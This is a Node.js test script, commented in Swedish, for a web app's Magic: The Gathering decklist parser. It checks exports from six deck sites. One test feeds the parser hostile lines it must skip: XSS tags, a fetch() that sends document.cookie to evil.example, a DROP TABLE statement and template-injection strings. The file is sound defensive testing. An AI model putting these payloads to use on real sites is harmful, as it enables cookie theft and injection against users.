#!/usr/bin/env node
/* Leklistparsern (dev/plan/lagen.md, D5-5) provad utan webbläsare: klipper ut
   parseDecklist … parseList ur index.html och kör exporter från Moxfield,
   Arena, MTGO, Archidekt, TappedOut och Deckstats igenom den. Kör:
   node dev/lista.cjs — slutar med "N OK, M FEL". Ingår i dev/kolla.sh. */
const fs = require('fs'), path = require('path'), assert = require('assert');
const src = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
const a = src.indexOf('const LEK_RUBRIKER = {'), b = src.indexOf('/* ══ BLOCK: DECKS');
if (a < 0 || b < 0 || b < a) { console.error('hittar inte parsern i index.html'); process.exit(2); }
const kod = src.slice(a, b);
const { parseDecklist, parseList, lekKanVaraNamn } = new Function('clamp', kod + '\nreturn { parseDecklist, parseList, lekKanVaraNamn };')((v, lo, hi) => v < lo ? lo : v > hi ? hi : v);

const ok = [], fel = [];
const prov = (namn, f) => { try { f(); ok.push('OK   ' + namn); } catch (e) { fel.push('FEL  ' + namn + ' — ' + e.message); } };
const kort = (l, sb) => l.filter(e => !!e.sb === !!sb).map(e => `${e.n} ${e.name}`);
const summa = (l, sb) => l.filter(e => !!e.sb === !!sb).reduce((s, e) => s + e.n, 0);

prov('Moxfield: main, blankrad, SIDEBOARD:, setkoder och foil', () => {
  const l = parseDecklist(`4 Lightning Bolt (2X2) 117
2 Counterspell (MH2) 267 *F*
20 Mountain (SLD) 1234★
1 Atraxa, Praetors' Voice (CMM) 320

SIDEBOARD:
3 Pyroblast (EMA) 142
2 Blue Elemental Blast (4ED) 60`);
  assert.deepEqual(kort(l, false), ['4 Lightning Bolt', '2 Counterspell', '20 Mountain', "1 Atraxa, Praetors' Voice"]);
  assert.deepEqual(kort(l, true), ['3 Pyroblast', '2 Blue Elemental Blast']);
  assert.equal(summa(l, false), 27); assert.equal(summa(l, true), 5);
});
prov('Arena: Deck/Sideboard/Companion/Commander, "Name"-raden hoppas över', () => {
  const l = parseDecklist(`Name Mono Red
Companion
1 Lurrus of the Dream-Den (IKO) 226

Commander
1 Ragavan, Nimble Pilferer (MH2) 138

Deck
4 Lightning Bolt (STA) 42
16 Mountain (M21) 275

Sideboard
2 Abrade (LTR) 116
1 Lurrus of the Dream-Den (IKO) 226`);
  assert.deepEqual(kort(l, false), ['1 Lurrus of the Dream-Den', '1 Ragavan, Nimble Pilferer', '4 Lightning Bolt', '16 Mountain']);
  assert.deepEqual(kort(l, true), ['2 Abrade', '1 Lurrus of the Dream-Den']);
  assert.deepEqual(l.filter(e => e.cmdr).map(e => e.name), ['Lurrus of the Dream-Den', 'Ragavan, Nimble Pilferer']);
  assert.ok(!l.some(e => /^Name/.test(e.name)), 'Name-raden blev ett kort');
});
prov('MTGO: två block utan rubriker — blankraden är sideboardet; ett block = allt main', () => {
  const l = parseDecklist(`4 Lightning Bolt
4 Monastery Swiftspear
12 Mountain

3 Smash to Smithereens
2 Roiling Vortex`);
  assert.equal(summa(l, false), 20); assert.deepEqual(kort(l, true), ['3 Smash to Smithereens', '2 Roiling Vortex']);
  const ett = parseDecklist(`4 Lightning Bolt\n12 Mountain`);
  assert.equal(summa(ett, true), 0); assert.equal(summa(ett, false), 16);
  // tre block utan rubriker: gruppering, inte sideboard
  const tre = parseDecklist(`4 Lightning Bolt\n\n4 Monastery Swiftspear\n\n12 Mountain`);
  assert.equal(summa(tre, true), 0); assert.equal(summa(tre, false), 20);
});
prov('Archidekt: 1x, (set) nr, [Kategori], ^taggar^, blankrader mellan kategorier, [Commander]', () => {
  const l = parseDecklist(`1x Atraxa, Praetors' Voice (cmm) 320 *F* [Commander{top}]

1x Sol Ring (c21) 263 [Artifacts] ^Have,#a0a0a0^
1x Arcane Signet (c21) 244 [Artifacts]

4x Forest (snc) 270 [Lands]
1x Cultivate (c21) 173 [Ramp] ^Own^`);
  assert.equal(summa(l, true), 0, 'blankraderna blev sideboard');
  assert.deepEqual(kort(l, false), ["1 Atraxa, Praetors' Voice", '1 Sol Ring', '1 Arcane Signet', '4 Forest', '1 Cultivate']);
  assert.deepEqual(l.filter(e => e.cmdr).map(e => e.name), ["Atraxa, Praetors' Voice"]);
});
prov('TappedOut: 4x Namn (SET), SB: rader, *F*', () => {
  const l = parseDecklist(`4x Lightning Bolt (M11)
4x Goblin Guide (ZEN) *F*
12x Mountain (M11)
SB: 2x Duress (M11)
SB: 3x Pyroblast`);
  assert.deepEqual(kort(l, false), ['4 Lightning Bolt', '4 Goblin Guide', '12 Mountain']);
  assert.deepEqual(kort(l, true), ['2 Duress', '3 Pyroblast']);
});
prov('Deckstats: //Main, //Sideboard, #!Commander, kommentarer, Maybeboard kastas', () => {
  const l = parseDecklist(`//Main
1 Kenrith, the Returned King #!Commander
4 Lightning Bolt
// en anteckning som inte är ett kort
//Sideboard
2 Duress
//Maybeboard
1 Black Lotus
About
Name: Min lek`);
  assert.deepEqual(kort(l, false), ['1 Kenrith, the Returned King', '4 Lightning Bolt']);
  assert.deepEqual(kort(l, true), ['2 Duress']);
  assert.ok(!l.some(e => e.name === 'Black Lotus'), 'Maybeboard kom med');
  assert.ok(!l.some(e => /Min lek/.test(e.name)), 'About kom med');
  assert.deepEqual(l.filter(e => e.cmdr).map(e => e.name), ['Kenrith, the Returned King']);
});
prov('regressioner: "4 Mountain", "4x", "(LTC) 268", "· M21", parseList platt utan sideboard', () => {
  assert.deepEqual(parseList('4 Mountain\n2x Forest\n1 Sol Ring (LTC) 268\n1 Opt · M21\nSB: 2 Duress'),
    ['Mountain', 'Mountain', 'Mountain', 'Mountain', 'Forest', 'Forest', 'Sol Ring', 'Opt']);
  assert.deepEqual(parseDecklist('  \n\n'), []);
  assert.deepEqual(parseDecklist('Nameless One\n1 Named Card').map(e => e.name), ['Nameless One', 'Named Card']);
});

prov('MES-175: prosa, adresser och kod hoppas över och räknas — de skickas aldrig till Scryfall', () => {
  const l = parseDecklist(`Ta bort "Jumpstart Boosters Foundations" leken för Jesper`);
  assert.deepEqual(l, []); assert.equal(l.hoppade, 1);
  const k = parseDecklist(`<script>alert(1)</script>
<img src=x onerror=alert(1)>
fetch('https://evil.example/steal?c=' + document.cookie);
DROP TABLE decks;
https://moxfield.com/decks/abc123
www.example.com
{{constructor.constructor('alert(1)')()}}
\${7*7}
kan du lägga till en lek med alla mina gröna kort från i går tack
4 Lightning Bolt`);
  assert.deepEqual(kort(k, false), ['4 Lightning Bolt']);
  assert.equal(k.hoppade, 9);
  assert.equal(parseDecklist('1 ' + 'A'.repeat(151)).hoppade, 1, 'för lång rad');
  assert.equal(parseDecklist('4 1234 5678').hoppade, 1, 'inga bokstäver');
});
prov('MES-175: riktiga namn med skiljetecken går igenom — utan och med antal', () => {
  for (const n of ['Circle of Protection: Artifacts', "Lim-Dûl's Vault", 'Jötun Grunt', 'Asmoranomardicadaistinaculdacar',
    'Borrowing 100,000 Arrows', 'Fire // Ice', 'Ach! Hans, Run!', '_____ Goblin', "Look at Me, I'm R&D", 'B.F.M. (Big Furry Monster)',
    'Who // What // When // Where // Why', 'Æther Vial'])
    assert.ok(lekKanVaraNamn(n, false) && lekKanVaraNamn(n, true), n);
  assert.ok(lekKanVaraNamn('Kongming, "Sleeping Dragon"', true), 'citattecken med antal');
  assert.ok(!lekKanVaraNamn('Kongming, "Sleeping Dragon"', false), 'citattecken utan antal');
  assert.ok(lekKanVaraNamn('The Ultimate Nightmare of Wizards of the Coast Customer Service', true), 'långt Un-namn med antal');
  const l = parseDecklist('Lightning Bolt\nSol Ring\n1 Kongming, "Sleeping Dragon"');
  assert.deepEqual(kort(l, false), ['1 Lightning Bolt', '1 Sol Ring', '1 Kongming, "Sleeping Dragon"']);
  assert.equal(l.hoppade, 0);
  assert.ok(!('medAntal' in l[0]), 'hjälpfältet läcker inte ut');
});

console.log([...ok, ...fel].join('\n'));
console.log(`\n${ok.length} OK, ${fel.length} FEL`);
process.exit(fel.length ? 1 : 0);
